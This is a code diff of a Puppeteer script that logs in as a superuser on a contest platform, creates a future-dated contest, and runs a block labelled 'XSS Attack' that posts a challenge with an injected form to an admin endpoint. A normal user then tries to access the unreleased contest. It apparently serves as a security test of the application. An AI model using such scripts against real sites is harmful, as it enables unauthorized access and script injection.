@@ -24,21 +24,44 @@ const superUserCookie = await login(superUserPage);
 console.log({ superUserCookie });
 
 // Create future contest
-await fetch(createUrl('/admin/contests/create'), {
-  credentials: 'include',
-  headers: {
-    Accept: 'application/json, text/plain, */*',
-    'Accept-Language': 'en-US,en;q=0.5',
-    'Content-Type': 'application/json;charset=utf-8',
-    'Sec-Fetch-Dest': 'empty',
-    'Sec-Fetch-Mode': 'cors',
-    'Sec-Fetch-Site': 'same-origin',
-    Cookie: superUserCookie
-  },
-  body: '{"name":"Future contest","description":"{\\"ops\\":[{\\"insert\\":\\"Future contest\\\\n\\"}]}","start_date":"2025-04-14 17:00:00","end_date":"2025-04-17 17:00:00","input":"asd","output":"asd","disallowed_languages":"awk,basic.net,csharp.net,python2,python2,awk,dotnet,csharp.net,basic.net"}',
-  method: 'POST',
-  mode: 'cors'
-});
+{
+  const startDate = new Date();
+  startDate.setFullYear(startDate.getFullYear() + 1);
+  const endDate = new Date(startDate);
+  endDate.setFullYear(endDate.getFullYear() + 1);
+
+  const body = JSON.stringify({
+    name: `Future contest ${startDate}`,
+    description: JSON.stringify({
+      ops: [
+        {
+          insert: 'Future contest\n'
+        }
+      ]
+    }),
+    start_date: startDate,
+    end_date: endDate,
+    input: 'asd',
+    output: 'asd',
+    disallowed_languages: 'awk,basic.net,csharp.net,python2,python2,awk,dotnet,csharp.net,basic.net'
+  });
+
+  await fetch(createUrl('/admin/contests/create'), {
+    credentials: 'include',
+    headers: {
+      Accept: 'application/json, text/plain, */*',
+      'Accept-Language': 'en-US,en;q=0.5',
+      'Content-Type': 'application/json;charset=utf-8',
+      'Sec-Fetch-Dest': 'empty',
+      'Sec-Fetch-Mode': 'cors',
+      'Sec-Fetch-Site': 'same-origin',
+      Cookie: superUserCookie
+    },
+    body,
+    method: 'POST',
+    mode: 'cors'
+  });
+}
 
 await superUserPage.goto(createUrl('/admin/contests'));
 
@@ -54,7 +77,7 @@ console.log({ futureContestUrl: futureContestEndpoint });
 {
   console.log('XSS Attack');
 
-  const body = {
+  const body = JSON.stringify({
     draft: 0,
     difficulty: 1,
     points: 10,
@@ -70,7 +93,7 @@ console.log({ futureContestUrl: futureContestEndpoint });
         </form>
         `,
     tests: [{ challenge_id: -1, name: '12', input: '12', output: '12', index: 0 }]
-  };
+  });
 
   const res = await fetch(createUrl('/admin/challenges/create'), {
     credentials: 'include',
@@ -85,7 +108,7 @@ console.log({ futureContestUrl: futureContestEndpoint });
       'Cache-Control': 'no-cache',
       Cookie: superUserCookie
     },
-    body: JSON.stringify(body),
+    body: body,
     method: 'POST',
     mode: 'cors'
   });
@@ -107,7 +130,6 @@ const userBrowser = await puppeteer.launch({
 const userPage = await userBrowser.newPage();
 console.log('Log in as a normal user');
 await login(userPage);
-
 
 // as normal user, access future contest
 {
